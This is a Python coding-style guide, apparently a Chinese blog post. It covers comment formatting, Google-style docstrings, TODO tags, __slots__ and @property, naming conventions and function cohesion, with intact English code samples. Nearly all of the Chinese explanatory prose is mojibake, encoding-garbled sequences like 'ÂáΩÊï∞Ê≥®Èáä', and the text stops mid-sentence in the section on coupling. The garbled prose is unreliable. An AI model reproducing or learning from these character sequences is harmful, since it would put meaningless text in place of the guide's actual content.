ÂáΩÊï∞Ê≥®Èáä‰∏≠Ôºå=ÂâçÂêéË¶ÅÊúâÁ©∫Ê†ºÔºåÂÜíÂè∑Âíå"-&gt;"ÁöÑÂâçÈù¢Êó†Á©∫Ê†ºÔºåÂêéÈù¢ÊúâÁ©∫Ê†º„ÄÇdef munge(sep: AnyStr = None):def munge() -&gt; AnyStr:# Â∞ΩÈáè‰∏ç‰ΩøÁî®Â§çÂêàËØ≠Âè•(Compound statements: Â§öÊù°ËØ≠Âè•ÂÜôÂú®Âêå‰∏ÄË°å)if foo == 'blah': do_blah_thing() ÊôÆÈÄöÊ≥®ÈáäÈÄöÁî®ËßÑÂàô: ‰∏é‰ª£Á†ÅËá™Áõ∏ÁüõÁõæÁöÑÊ≥®ÈáäÊØîÊ≤°Ê≥®ÈáäÊõ¥Â∑Æ„ÄÇ‰øÆÊîπ‰ª£Á†ÅÊó∂Ë¶Å‰ºòÂÖàÊõ¥Êñ∞Ê≥®ÈáäÔºÅ Ê≥®ÈáäÊòØÂÆåÊï¥ÁöÑÂè•Â≠ê„ÄÇÂ¶ÇÊûúÊ≥®ÈáäÊòØÊñ≠Âè•ÔºåÈ¶ñÂ≠óÊØçÂ∫îËØ•Â§ßÂÜôÔºåÈô§ÈùûÂÆÉÊòØÂ∞èÂÜôÂ≠óÊØçÂºÄÂ§¥ÁöÑÊ†áËØÜÁ¨¶(Ê∞∏Ëøú‰∏çË¶Å‰øÆÊîπÊ†áËØÜÁ¨¶ÁöÑÂ§ßÂ∞èÂÜô)„ÄÇ Â¶ÇÊûúÊ≥®ÈáäÂæàÁü≠ÔºåÂèØ‰ª•ÁúÅÁï•Êú´Â∞æÁöÑÂè•Âè∑„ÄÇÊ≥®ÈáäÂùóÈÄöÂ∏∏Áî±‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÊÆµËêΩÁªÑÊàê„ÄÇÊÆµËêΩÁî±ÂÆåÊï¥ÁöÑÂè•Â≠êÊûÑÊàê‰∏îÊØè‰∏™Âè•Â≠êÂ∫îËØ•‰ª•ÁÇπÂè∑(ÂêéÈù¢Ë¶ÅÊúâ‰∏§‰∏™Á©∫Ê†º)ÁªìÊùüÔºåÂπ∂Ê≥®ÊÑèÊñ≠ËØçÂíåÁ©∫Ê†º„ÄÇ ÈùûËã±ËØ≠ÂõΩÂÆ∂ÁöÑÁ®ãÂ∫èÂëòËØ∑Áî®Ëã±ËØ≠‰π¶ÂÜô‰Ω†ÁöÑÊ≥®ÈáäÔºåÈô§Èùû‰Ω†200%Á°Æ‰ø°‰ª£Á†ÅÊ∞∏Ëøú‰∏ç‰ºöË¢´‰∏çÊáÇ‰Ω†ÁöÑËØ≠Ë®ÄÁöÑ‰∫∫ÈòÖËØª„ÄÇ Ê≥®ÈáäÂùó: Ê≥®ÈáäÂùóÈÄöÂ∏∏Â∫îÁî®Âú®‰ª£Á†ÅÂâçÔºåÂπ∂ÂíåËøô‰∫õ‰ª£Á†ÅÊúâÂêåÊ†∑ÁöÑÁº©Ëøõ„ÄÇÊØèË°å‰ª• ‚Äò# ‚Äò(Èô§ÈùûÂÆÉÊòØÊ≥®ÈáäÂÜÖÁöÑÁº©ËøõÊñáÊú¨ÔºåÊ≥®ÊÑè#ÂêéÈù¢ÊúâÁ©∫Ê†º)„ÄÇ Ê≥®ÈáäÂùóÂÜÖÁöÑÊÆµËêΩÁî®‰ªÖÂåÖÂê´Âçï‰∏™ ‚Äò#‚Äô ÁöÑË°åÂàÜÂâ≤„ÄÇ Ë°åÂÜÖÊ≥®Èáä: ÊÖéÁî®Ë°åÂÜÖÊ≥®Èáä(Inline Comments) ËäÇ‰ø≠‰ΩøÁî®Ë°åÂÜÖÊ≥®Èáä„ÄÇ Ë°åÂÜÖÊ≥®ÈáäÊòØÂíåËØ≠Âè•Âú®Âêå‰∏ÄË°åÔºåËá≥Â∞ëÁî®‰∏§‰∏™Á©∫Ê†ºÂíåËØ≠Âè•ÂàÜÂºÄ„ÄÇË°åÂÜÖÊ≥®Èáä‰∏çÊòØÂøÖÈúÄÁöÑÔºåÈáçÂ§çÁΩóÂó¶‰ºö‰Ωø‰∫∫ÂàÜÂøÉ„ÄÇ 123456# We use a weighted dictionary search to find out where i is in# the array. We extrapolate position based on the largest num# in the array and the array size and then do binary search to# get the exact number.if i &amp; (i-1) == 0: # true iff i is a power of 2 ÊñáÊ°£Ê≥®ÈáäËøôÈÉ®ÂàÜÂæàÈáçË¶Å, ‰ªñÊòØPythonÁã¨ÊúâÁöÑ, ‰∏∫ÊâÄÊúâÂÖ¨ÂÖ±Ê®°Âùó„ÄÅÂáΩÊï∞„ÄÅÁ±ªÂíåÊñπÊ≥ï‰π¶ÂÜôÊñáÊ°£Â≠óÁ¨¶‰∏≤„ÄÇÈùûÂÖ¨ÂºÄÊñπÊ≥ï‰∏ç‰∏ÄÂÆöÊúâÊñáÊ°£Â≠óÁ¨¶‰∏≤ÔºåÂª∫ËÆÆÊúâÊ≥®Èáä(Âá∫Áé∞Âú®defË°å‰πãÂêé)Êù•ÊèèËø∞Ëøô‰∏™ÊñπÊ≥ïÂÅö‰ªÄ‰πà, ËØ¶ÊÉÖÂèÇËÄÉPEP 257 ÊñáÊ°£Â≠óÁ¨¶‰∏≤Á∫¶ÂÆö, ‰ΩÜÊòØËøôÈÉ®ÂàÜÊàëÊØîËæÉÊé®Â¥áGoogle StyleÈ£éÊ†º„ÄÇ ÊñáÊ°£Â≠óÁ¨¶‰∏≤‰ªÄ‰πàÊòØÊñáÊ°£Â≠óÁ¨¶‰∏≤(Document String):ÊñáÊ°£Â≠óÁ¨¶‰∏≤ÊòØÂåÖ, Ê®°Âùó, Á±ªÊàñÂáΩÊï∞ÈáåÁöÑÁ¨¨‰∏Ä‰∏™ËØ≠Âè•. Ëøô‰∫õÂ≠óÁ¨¶‰∏≤ÂèØ‰ª•ÈÄöËøáÂØπË±°ÁöÑ__doc__ÊàêÂëòË¢´Ëá™Âä®ÊèêÂèñ, Âπ∂‰∏îË¢´pydocÊâÄÁî®. ÊñáÊ°£Â≠óÁ¨¶‰∏≤ÁöÑÊ†ºÂºè:È¶ñÂÖàÊòØ‰∏ÄË°å‰ª•Âè•Âè∑, ÈóÆÂè∑ÊàñÊÉäÂèπÂè∑ÁªìÂ∞æÁöÑÊ¶ÇËø∞(ÊàñËÄÖËØ•ÊñáÊ°£Â≠óÁ¨¶‰∏≤ÂçïÁ∫ØÂè™Êúâ‰∏ÄË°å). Êé•ÁùÄÊòØ‰∏Ä‰∏™Á©∫Ë°å. Êé•ÁùÄÊòØÊñáÊ°£Â≠óÁ¨¶‰∏≤Ââ©‰∏ãÁöÑÈÉ®ÂàÜ,ÂÆÉÂ∫îËØ•‰∏éÊñáÊ°£Â≠óÁ¨¶‰∏≤ÁöÑÁ¨¨‰∏ÄË°åÁöÑÁ¨¨‰∏Ä‰∏™ÂºïÂè∑ÂØπÈΩê. ‰∏ãÈù¢ÊúâÊõ¥Â§öÊñáÊ°£Â≠óÁ¨¶‰∏≤ÁöÑÊ†ºÂºèÂåñËßÑËåÉ. Ê®°ÂùóÊñáÊ°£Ê®°ÂùóËØ¥Êòé: ÂØπËøô‰∏™Ê®°ÂùóËøõË°åÊ¶ÇË≤åÊÄßÁöÑÊèèËø∞, ÊØîÂ¶ÇJsonÂ∫ìÁöÑËØ¥Êòé1234567891011121314151617181920212223242526r"""JSON (JavaScript Object Notation) &lt;http://json.org&gt; is a subset ofJavaScript syntax (ECMA-262 3rd edition) used as a lightweight datainterchange format.:mod:`json` exposes an API familiar to users of the standard library:mod:`marshal` and :mod:`pickle` modules. It is the externally maintainedversion of the :mod:`json` library contained in Python 2.6, but maintainscompatibility with Python 2.4 and Python 2.5 and (currently) hassignificant performance advantages, even without using the optional Cextension for speedups.Compact encoding:: &gt;&gt;&gt; import json &gt;&gt;&gt; json.dumps([1,2,3,&#123;'4': 5, '6': 7&#125;], sort_keys=True, separators=(',',':')) '[1,2,3,&#123;"4":5,"6":7&#125;]'Using json.tool from the shell to validate and pretty-print:: $ echo '&#123;"json":"obj"&#125;' | python -m json.tool &#123; "json": "obj" &#125; $ echo '&#123; 1.2:3.4&#125;' | python -m json.tool Expecting property name enclosed in double quotes: line 1 column 3 (char 2)""" ÂáΩÊï∞ÂíåÊñπÊ≥ïÊñáÊ°£ËøôÈáåËØ¥ÁöÑÂáΩÊï∞,ÂåÖÊã¨ÂáΩÊï∞, ÊñπÊ≥ï, ‰ª•ÂèäÁîüÊàêÂô®„ÄÇ ‰∏Ä‰∏™ÂáΩÊï∞ÂøÖÈ°ªË¶ÅÊúâÊñáÊ°£Â≠óÁ¨¶‰∏≤, Èô§ÈùûÂÆÉÊª°Ë∂≥‰ª•‰∏ãÊù°‰ª∂: Â§ñÈÉ®‰∏çÂèØËßÅ ÈùûÂ∏∏Áü≠Â∞è ÁÆÄÂçïÊòé‰∫Ü ÊñáÊ°£Â≠óÁ¨¶‰∏≤Â∫îËØ•Êèê‰æõË∂≥Â§üÁöÑ‰ø°ÊÅØ, ÂΩìÂà´‰∫∫ÁºñÂÜô‰ª£Á†ÅË∞ÉÁî®ËØ•ÂáΩÊï∞Êó∂, ‰ªñ‰∏çÈúÄË¶ÅÁúã‰∏ÄË°å‰ª£Á†Å, Âè™Ë¶ÅÁúãÊñáÊ°£Â≠óÁ¨¶‰∏≤Â∞±ÂèØ‰ª•‰∫Ü.Âõ†Ê≠§ÈúÄË¶ÅÊèèËø∞Ê∏ÖÊ•ö‰ª•‰∏ãÂá†ÁÇπ: ÂáΩÊï∞ÂèÇÊï∞: ArgsÂàóÂá∫ÊØè‰∏™ÂèÇÊï∞ÁöÑÂêçÂ≠ó, Âπ∂Âú®ÂêçÂ≠óÂêé‰ΩøÁî®‰∏Ä‰∏™ÂÜíÂè∑Âíå‰∏Ä‰∏™Á©∫Ê†º, ÂàÜÈöîÂØπËØ•ÂèÇÊï∞ÁöÑÊèèËø∞.Â¶ÇÊûúÊèèËø∞Â§™ÈïøË∂ÖËøá‰∫ÜÂçïË°å80Â≠óÁ¨¶,‰ΩøÁî®2ÊàñËÄÖ4‰∏™Á©∫Ê†ºÁöÑÊÇ¨ÊåÇÁº©Ëøõ(‰∏éÊñá‰ª∂ÂÖ∂‰ªñÈÉ®ÂàÜ‰øùÊåÅ‰∏ÄËá¥). ÊèèËø∞Â∫îËØ•ÂåÖÊã¨ÊâÄÈúÄÁöÑÁ±ªÂûãÂíåÂê´‰πâ. Â¶ÇÊûú‰∏Ä‰∏™ÂáΩÊï∞Êé•Âèófoo(ÂèØÂèòÈïøÂ∫¶ÂèÇÊï∞ÂàóË°®)ÊàñËÄÖ**bar (‰ªªÊÑèÂÖ≥ÈîÆÂ≠óÂèÇÊï∞), Â∫îËØ•ËØ¶ÁªÜÂàóÂá∫fooÂíå**bar. Ê≠£Â∏∏ËøîÂõû: Returns/YieldsÊèèËø∞ËøîÂõûÂÄºÁöÑÁ±ªÂûãÂíåËØ≠‰πâ. Â¶ÇÊûúÂáΩÊï∞ËøîÂõûNone, Ëøô‰∏ÄÈÉ®ÂàÜÂèØ‰ª•ÁúÅÁï•. ÂºÇÂ∏∏ËøîÂõû: Raises:ÂàóÂá∫‰∏éÊé•Âè£ÊúâÂÖ≥ÁöÑÊâÄÊúâÂºÇÂ∏∏. 123456789101112131415161718192021222324252627282930def fetch_bigtable_rows(big_table, keys, other_silly_variable=None): """Fetches rows from a Bigtable. Retrieves rows pertaining to the given keys from the Table instance represented by big_table. Silly things may happen if other_silly_variable is not None. Args: big_table: An open Bigtable Table instance. keys: A sequence of strings representing the key of each table row to fetch. other_silly_variable: Another optional variable, that has a much longer name than the other args, and which does nothing. Returns: A dict mapping keys to the corresponding table row data fetched. Each row is represented as a tuple of strings. For example: &#123;'Serak': ('Rigel VII', 'Preparer'), 'Zim': ('Irk', 'Invader'), 'Lrrr': ('Omicron Persei 8', 'Emperor')&#125; If a key from the keys argument is missing from the dictionary, then that row was not found in the table. Raises: IOError: An error occurred accessing the bigtable.Table object. """ pass Á±ªÊñáÊ°£ÂêåÁêÜÁ±ª‰πüÈúÄË¶ÅÂÅöËØ¶Â∞ΩÁöÑÊèèËø∞: ËØ•Á±ªÁöÑÁõÆÁöÑ, ‰ª•ÂèäÊ¶ÇË≤åÊèèËø∞ Á±ªÊúâÂÖ¨ÂÖ±Â±ûÊÄß(Attributes), ÈúÄË¶ÅÊèèËø∞ÂÖ∂ÊÑè‰πâ Ê≥®ÊÑè‰∫ãÈ°π ÁªßÊâøobject, Âõ†‰∏∫objectÂÆûÁé∞‰∫Ü‰∏Ä‰∫õÂÜÖÁΩÆÊñπÊ≥ï,Êñπ‰æøÂÖºÂÆπ„ÄÇ 123456789101112131415161718class SampleClass(object): """Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. """ def __init__(self, likes_spam=False): """Inits SampleClass with blah.""" self.likes_spam = likes_spam self.eggs = 0 def public_method(self): """Performs operation blah.""" TODOÊ≥®ÈáäÂ¶ÇÊûúÁ±ªÊàñËÄÖÊñπÊ≥ïÔºåÂáΩÊï∞ Ê≤°ÊúâÂÆûÁé∞ÂÆåÊï¥ÂäüËÉΩ, ËØ∑‰ΩøÁî®TODOÊ†áËÆ∞, ÂæàÂ§öIDEÈÉΩËÉΩÊâæÂà∞Ëøô‰∏™Ê†áËÆ∞, Êñπ‰æø‰ª•ÂêéÊîπËøõ, Âà´ÁïôÂùë.12# TODO(kl@gmail.com): Use a "*" here for string repetition.# TODO(Zeke) Change this to use relations. ËÆøÈóÆÊéßÂà∂ÂêàÁêÜÁöÑËÆøÈóÆÊéßÂà∂‰ºö‰ΩøÂæó‰ª£Á†ÅÊõ¥Âä†ÂÅ•Â£Æ __slots__: ÊéßÂà∂ÂØπË±°ÂèØ‰ª•ÁªëÂÆöÁöÑÂ±ûÊÄß, ÈÅøÂÖçÂØπË±°Ë¢´‰∏¥Êó∂Ê∑ªÂä†Â±ûÊÄßÔºåÈÄ†ÊàêÂØπË±°ÁöÑ‰∏çÂèØÈ¢ÑÊúüË°å‰∏∫„ÄÇ @property: ÈÄöËøáÂ±ûÊÄßË£ÖÈ•∞Âô®ÊéßÂà∂Â±ûÊÄßÁöÑËØªÂíåÂÜôÁöÑË°å‰∏∫, Èò≤Ê≠¢‰∏çÁ¨¶ÂêàËßÑËåÉÊï∞ÊçÆÁöÑÂΩïÂÖ•„ÄÇ __ÊàñËÄÖ_: ‰ΩøÁî®‰∏ãÂàíÁ∫øÂºÄÂ§¥ÁöÑÂèòÈáèÔºå‰∏∫ÁßÅÊúâÂèòÈáè(Âè™ÊòØÂà´Âêç‰∫Ü, ‰Ω†ÁúüÊÉ≥ËÆøÈóÆËøòÊòØÊúâÂäûÊ≥ïÁöÑ, ‰ΩÜÊòØËØ∑‰∏çË¶ÅËøôÊ†∑ÂÅö)„ÄÇ __all__: ÂØπ‰∫éfrom importÊù•ËØ¥, ÂØºÂá∫ÊåáÂÆöÂØπË±°, Èò≤Ê≠¢ÂØºÂá∫ÂÖ®Â±ÄÂèòÈáè„ÄÇ Ê≥®ÊÑè: ÂØπÊö¥Èú≤Âá∫ÂéªÁöÑÂÖ±ÊúâÂèòÈáèËØ∑ÊÖéÈáç, Âõ†‰∏∫Â¶ÇÊûú‰Ω†Êö¥Èú≤Âá∫ÂéªËøá‰ºö, ‰∏ãÊ¨°Âú®Ë∞ÉÊï¥Â∞±ÈúÄË¶ÅËÄÉËôëÂà∞ÂÖºÂÆπÊÄß‰∫Ü, ÊâÄ‰ª•‰ºòÂÖà‰ΩøÁî®ÁßÅÊúâÂèòÈáè(__ÊàñËÄÖ_)„ÄÇ 123456789101112131415class Student(object): __slots__ = ['birth', 'age'] @property def birth(self): return self._birth @birth.setter def birth(self, value): self._birth = value @property def age(self): return 2015 - self._birth ÂëΩÂêçÁ∫¶ÂÆöPythonÂ∫ìÁöÑÂëΩÂêçÁ∫¶ÂÆöÊúâÁÇπÊ∑∑‰π±Ôºå‰∏çÂèØËÉΩÂÆåÂÖ®‰∏ÄËá¥„ÄÇ‰ΩÜ‰æùÁÑ∂Êúâ‰∫õÊôÆÈÅçÊé®ËçêÁöÑÂëΩÂêçËßÑËåÉÁöÑ„ÄÇÊñ∞ÁöÑÊ®°ÂùóÂíåÂåÖ (ÂåÖÊã¨Á¨¨‰∏âÊñπÁöÑÊ°ÜÊû∂) Â∫îËØ•ÈÅµÂæ™Ëøô‰∫õÊ†áÂáÜ„ÄÇÂØπ‰∏çÂêåÈ£éÊ†ºÁöÑÂ∑≤ÊúâÁöÑÂ∫ìÔºåÂª∫ËÆÆ‰øùÊåÅÂÜÖÈÉ®ÁöÑ‰∏ÄËá¥ÊÄß„ÄÇ ÂåÖÂíåÊ®°ÂùóÂêç: Ê®°ÂùóÂêçË¶ÅÁÆÄÁü≠ÔºåÂÖ®ÈÉ®Áî®Â∞èÂÜôÂ≠óÊØçÔºåÂèØ‰ΩøÁî®‰∏ãÂàíÁ∫ø‰ª•ÊèêÈ´òÂèØËØªÊÄß„ÄÇÂåÖÂêçÂíåÊ®°ÂùóÂêçÁ±ª‰ººÔºå‰ΩÜ‰∏çÊé®Ëçê‰ΩøÁî®‰∏ãÂàíÁ∫ø Á±ªÂêç: ÈÅµÂæ™CapWord„ÄÇ ÂáΩÊï∞ÂíåÊñπÊ≥ïÁöÑÂèÇÊï∞: ÂÆû‰æãÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØ ‚Äòself‚Äô„ÄÇÁ±ªÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØ ‚Äòcls‚Äô„ÄÇÂ¶ÇÊûúÂáΩÊï∞ÁöÑÂèÇÊï∞Âêç‰∏é‰øùÁïôÂÖ≥ÈîÆÂ≠óÂÜ≤Á™ÅÔºåÈÄöÂ∏∏Âú®ÂèÇÊï∞ÂêçÂêéÂä†‰∏Ä‰∏™‰∏ãÂàíÁ∫ø„ÄÇ ÊñπÊ≥ïÂêçÂíåÂÆû‰æãÂèòÈáè: ÂêåÂáΩÊï∞ÂëΩÂêçËßÑÂàô„ÄÇ ÈùûÂÖ¨ÂºÄÊñπÊ≥ïÂíåÂÆû‰æãÂèòÈáèÂ¢ûÂä†‰∏Ä‰∏™ÂâçÁΩÆ‰∏ãÂàíÁ∫ø„ÄÇ ‰∏∫ÈÅøÂÖç‰∏éÂ≠êÁ±ªÂëΩÂêçÂÜ≤Á™ÅÔºåÈááÁî®‰∏§‰∏™ÂâçÁΩÆ‰∏ãÂàíÁ∫øÊù•Ëß¶ÂèëÈáçÊï¥„ÄÇÁ±ªFooÂ±ûÊÄßÂêç‰∏∫__aÔºå ‰∏çËÉΩ‰ª• Foo.__aËÆøÈóÆ„ÄÇ(ÊâßËëóÁöÑÁî®Êà∑ËøòÊòØÂèØ‰ª•ÈÄöËøáFoo._Foo__a„ÄÇ) ÈÄöÂ∏∏ÂèåÂâçÁΩÆ‰∏ãÂàíÁ∫ø‰ªÖË¢´Áî®Êù•ÈÅøÂÖç‰∏éÂü∫Á±ªÁöÑÂ±ûÊÄßÂèëÁîüÂëΩÂêçÂÜ≤Á™Å„ÄÇ ÂáΩÊï∞Âêç: ÂáΩÊï∞ÂêçÂ∫îËØ•‰∏∫Â∞èÂÜôÔºåÂøÖË¶ÅÊó∂ÂèØÁî®‰∏ãÂàíÁ∫øÂàÜÈöîÂçïËØç‰ª•Â¢ûÂä†ÂèØËØªÊÄß„ÄÇ mixedCase(Ê∑∑ÂêàÂ§ßÂ∞èÂÜô)‰ªÖË¢´ÂÖÅËÆ∏Áî®‰∫éÂÖºÂÆπÊÄßËÄÉËôë(Â¶Ç: threading.py)„ÄÇ ÂºÇÂ∏∏Âêç: Â¶ÇÊûúÁ°ÆÂÆûÊòØÈîôËØØÔºåÈúÄË¶ÅÂú®Á±ªÂêçÊ∑ªÂä†ÂêéÁºÄ ‚ÄúError‚Äù„ÄÇ ÂÖ®Â±ÄÂèòÈáèÂêç: ÂèòÈáèÂ∞ΩÈáèÂè™Áî®‰∫éÊ®°ÂùóÂÜÖÈÉ®ÔºåÁ∫¶ÂÆöÁ±ª‰ººÂáΩÊï∞„ÄÇ ÂØπËÆæËÆ°‰∏∫ÈÄöËøá ‚Äúfrom M import ‚Äù Êù•‰ΩøÁî®ÁöÑÊ®°ÂùóÔºåÂ∫îÈááÁî®__all__Êú∫Âà∂Êù•Èò≤Ê≠¢ÂØºÂÖ•ÂÖ®Â±ÄÂèòÈáèÔºõÊàñËÄÖ‰∏∫ÂÖ®Â±ÄÂèòÈáèÂä†‰∏Ä‰∏™ÂâçÁΩÆ‰∏ãÂàíÁ∫ø„ÄÇ Â∏∏Èáè: Â∏∏ÈáèÈÄöÂ∏∏Âú®Ê®°ÂùóÁ∫ßÂÆö‰πâ,Áî±Â§ßÂÜôÂ≠óÊØçÁî®‰∏ãÂàíÁ∫øÂàÜÈöîÁªÑÊàê„ÄÇÊØîÂ¶ÇÊã¨MAX_OVERFLOWÂíåTOTAL„ÄÇ ÂêàÁêÜÁöÑËÆæËÆ°Êé•Âè£ËÆæËÆ°ËÄÉËôëÁ±ªÁöÑÊñπÊ≥ïÂíåÂÆû‰æãÂèòÈáè(ÁªüÁß∞‰∏∫Â±ûÊÄß)ÊòØÂê¶ÂÖ¨ÂºÄ„ÄÇÂ¶ÇÊûúÊúâÁñëÈóÆÔºåÈÄâÊã©‰∏çÂÖ¨ÂºÄÔºõÊääÂÖ∂Êîπ‰∏∫ÂÖ¨ÂºÄÊØîÊääÂÖ¨ÂºÄÂ±ûÊÄßÊîπ‰∏∫ÈùûÂÖ¨ÂºÄË¶ÅÂÆπÊòì„ÄÇÂÖ¨ÂºÄÂ±ûÊÄßÂèØ‰æõÊâÄÊúâ‰∫∫‰ΩøÁî®ÔºåÂπ∂ÈÄöÂ∏∏ÂêëÂêéÂÖºÂÆπ„ÄÇÈùûÂÖ¨ÂºÄÂ±ûÊÄß‰∏çÁªôÁ¨¨‰∏âÊñπ‰ΩøÁî®„ÄÅÂèØÂèòÁîöËá≥Ë¢´ÁßªÈô§„ÄÇËøôÈáå‰∏ç‰ΩøÁî®ÊúØËØ≠‚Äùprivate‚ÄùÔºå Python‰∏≠Ê≤°ÊúâÂ±ûÊÄßÊòØÁúüÊ≠£ÁßÅÊúâÁöÑ„ÄÇÂè¶‰∏ÄÁ±ªÂ±ûÊÄßÊòØÂ≠êÁ±ªAPI(Âú®ÂÖ∂‰ªñËØ≠Ë®Ä‰∏≠ÈÄöÂ∏∏Áß∞‰∏∫ ‚Äúprotected‚Äù)„ÄÇ ‰∏Ä‰∫õÁ±ªË¢´ËÆæËÆ°‰∏∫Âü∫Á±ªÔºåÂèØ‰ª•Êâ©Â±ïÂíå‰øÆÊîπ„ÄÇ Ë∞®ËÆ∞Ëøô‰∫õPythonÊåáÂçóÔºö ÂÖ¨ÂºÄÂ±ûÊÄßÂ∫îËØ•Ê≤°ÊúâÂâçÂØº‰∏ãÂàíÁ∫ø Â¶ÇÊûúÂÖ¨ÂºÄÂ±ûÊÄßÂêçÂíå‰øùÁïôÂÖ≥ÈîÆÂ≠óÂÜ≤Á™ÅÔºåÂèØ‰ª•Ê∑ªÂä†ÂêéÁΩÆ‰∏ãÂàíÁ∫ø ÁÆÄÂçïÁöÑÂÖ¨ÂºÄÊï∞ÊçÆÂ±ûÊÄßÔºåÊúÄÂ•ΩÂè™ÂÖ¨ÂºÄÂ±ûÊÄßÂêçÔºåÊ≤°ÊúâÂ§çÊùÇÁöÑËÆøÈóÆ/‰øÆÊîπÊñπÊ≥ïÔºåpythonÁöÑPropertyÊèê‰æõ‰∫ÜÂæàÂ•ΩÁöÑÂ∞ÅË£ÖÊñπÊ≥ï„ÄÇ Â¶ÇÊûú‰∏çÂ∏åÊúõÂ≠êÁ±ª‰ΩøÁî®ÁöÑÂ±ûÊÄßÔºåËÄÉËôëÁî®‰∏§‰∏™ÂâçÁΩÆ‰∏ãÂàíÁ∫ø(Ê≤°ÊúâÂêéÁΩÆ‰∏ãÂàíÁ∫ø)ÂëΩÂêç ‰ªª‰ΩïÂêëÂêéÂÖºÂÆπÁöÑ‰øùËØÅÂè™ÈÄÇÁî®‰∫éÂÖ¨ÂÖ±Êé•Âè£„ÄÇ ÊñáÊ°£ÂåñÁöÑÊé•Âè£ÈÄöÂ∏∏ÊòØÂÖ¨ÂÖ±ÁöÑÔºåÈô§ÈùûÊòéËØ¥ÊòéÊòØ‰∏¥Êó∂ÁöÑÊàñ‰∏∫ÂÜÖÈÉ®Êé•Âè£„ÄÅÂÖ∂‰ªñÊâÄÊúâÊé•Âè£ÈªòËÆ§ÊòØÂÜÖÈÉ®ÁöÑ„ÄÇ ‰∏∫‰∫ÜÊõ¥Â•ΩÂú∞ÊîØÊåÅÂÜÖÁúÅÔºåÊ®°ÂùóË¶ÅÂú®__all__Â±ûÊÄßÂàóÂá∫ÂÖ¨ÂÖ±API„ÄÇ ÂÜÖÈÉ®Êé•Âè£Ë¶ÅÊúâÂâçÁΩÆ‰∏ãÂàíÁ∫ø„ÄÇ Â¶ÇÊûúÂëΩÂêçÁ©∫Èó¥(ÂåÖ„ÄÅÊ®°ÂùóÊàñÁ±ª)ÊòØÂÜÖÈÉ®ÁöÑÔºåÈáåÈù¢ÁöÑÊé•Âè£‰πüÊòØÂÜÖÈÉ®ÁöÑ„ÄÇ ÂØºÂÖ•ÂêçÁß∞Â∫îËßÜ‰∏∫ÂÆûÁé∞ÁªÜËäÇ„ÄÇÂÖ∂‰ªñÊ®°Âùó‰∏çËÉΩÈó¥Êé•ËÆøÂêçÂ≠óÔºåÈô§ÈùûÂú®Ê®°ÂùóÁöÑAPIÊñáÊ°£‰∏≠ÊòéÁ°ÆËÆ∞ËΩΩÔºåÂ¶Ços.path‰∏≠ÊàñÂåÖÁöÑ__init__Êö¥Èú≤‰∫ÜÂ≠êÊ®°Âùó„ÄÇ ÂáΩÊï∞ËÆæËÆ°ÂΩìÊµÅÁ®ãË∂≥Â§üÁπÅÊùÇÊó∂ÔºåÂ∞±Ë¶ÅËÄÉËôëÂáΩÊï∞ÔºåÂèäÂ¶Ç‰ΩïÂ∞ÜÂáΩÊï∞ÁªÑÂêàÂú®‰∏ÄËµ∑„ÄÇÂú®Python‰∏≠ÂÅöÂáΩÊï∞ËÆæËÆ°Ôºå‰∏ªË¶ÅËÄÉËôëÂà∞ÂáΩÊï∞Â§ßÂ∞è„ÄÅËÅöÂêàÊÄß„ÄÅËÄ¶ÂêàÊÄß‰∏â‰∏™ÊñπÈù¢ÔºåËøô‰∏âËÄÖÂ∫îËØ•ÂΩíÁªì‰∫éËßÑÂàí‰∏éËÆæËÆ°ÁöÑËåÉÁï¥„ÄÇÈ´òÂÜÖËÅö„ÄÅ‰ΩéËÄ¶ÂêàÂàôÊòØ‰ªª‰ΩïËØ≠Ë®ÄÂáΩÊï∞ËÆæËÆ°ÁöÑÊÄª‰ΩìÂéüÂàô„ÄÇ Â¶Ç‰ΩïÂ∞Ü‰ªªÂä°ÂàÜËß£ÊàêÊõ¥ÊúâÈíàÂØπÊÄßÁöÑÂáΩÊï∞‰ªéËÄåÂØºËá¥‰∫ÜËÅöÂêàÊÄß Â¶Ç‰ΩïËÆæËÆ°ÂáΩÊï∞Èó¥ÁöÑÈÄö‰ø°ÂàôÂèàÊ∂âÂèäÂà∞ËÄ¶ÂêàÊÄß Â¶Ç‰ΩïËÆæËÆ°ÂáΩÊï∞ÁöÑÂ§ßÂ∞èÁî®‰ª•Âä†Âº∫ÂÖ∂ËÅöÂêàÊÄßÂèäÈôç‰ΩéÂÖ∂ËÄ¶ÂêàÊÄß ËÅöÂêà ÂÆåÁæéÁöÑÁ®ãÂ∫èËÆæËÆ°ÔºåÊØè‰∏™ÂáΩÊï∞Â∫îËØ•ËÄå‰∏îÂè™ÈúÄÂÅö‰∏Ä‰ª∂‰∫ã ÊØîÂ¶ÇËØ¥:ÊääÂ§ßË±°ÊîæËøõÂÜ∞ÁÆ±ÂàÜ‰∏âÊ≠•:ÊääÈó®ÊâìÂºÄ„ÄÅÊääÂ§ßË±°ÊîæËøõÂéª„ÄÅÊääÈó®ÂÖ≥‰∏ä„ÄÇ ËøôÊ†∑Â∞±Â∫îËØ•ÂÜô‰∏â‰∏™ÂáΩÊï∞ËÄå‰∏çÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÊãøÊâÄÊúâÁöÑ‰∫ãÂÖ®ÂÅö‰∫Ü„ÄÇËøôÊ†∑ÁªìÊûÑÊ∏ÖÊô∞ÔºåÂ±ÇÊ¨°ÂàÜÊòéÔºå‰πüÂ•ΩÁêÜËß£ÔºÅ Â§ßÂ∞è Python‰ª£Á†Å‰ª•ÁÆÄÂçïÊòé‰∫ÜËëóÁß∞Ôºå‰∏Ä‰∏™ËøáÈïøÊàñËÄÖÊúâÁùÄÊ∑±Â±ÇÂµåÂ•óÁöÑÂáΩÊï∞ÂæÄÂæÄÊàê‰∏∫ËÆæËÆ°Áº∫Èô∑ÁöÑÂæÅÂÖÜ„ÄÇ Â¶ÇÊûúÈ°πÁõÆ‰∏≠ËÆæËÆ°ÁöÑ‰∏Ä‰∏™ÂáΩÊï∞ÈúÄË¶ÅÁøªÈ°µÊâçËÉΩÁúãÂÆåÁöÑËØùÔºåÂ∞±Ë¶ÅËÄÉËôëÂ∞ÜÂáΩÊï∞ÊãÜÂàÜ‰∫Ü„ÄÇ ËÄ¶Âêà ÂèÇÊï∞‰º†ÂÖ•ÔºåreturnÁªìÊûú, 